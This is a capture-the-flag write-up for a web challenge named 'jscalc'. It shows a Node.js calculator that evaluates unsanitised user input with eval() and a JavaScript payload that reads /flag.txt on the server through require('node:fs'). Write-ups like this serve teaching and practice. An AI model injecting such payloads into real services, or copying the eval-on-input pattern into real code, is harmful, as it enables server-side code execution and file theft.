---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Web: jscalc

On the website, there is an input which says: `A super secure Javascript calculator with the help of eval() 🤮` Ok, the `eval` seems interesting, as it is THE insecure function in JS.

Let's see the code.

## Code

In the code, there is a frontend javascript, that sends the input to backed NodeJS API. And there, this following code is called on the unsanitised input:

```js
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${ formula } ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}
```

That's that then.

## Exploit

To get the flag, I just need to read it. So I make the NodeJS to execute my custom function that reads a file (`/flag.txt`).

```js
(function() {
  const fs = require('node:fs');
  const data = fs.readFileSync('/flag.txt', 'utf8');
  return data;
})()
```

And thats it. The function is defined, execured, and results returned as the "computation".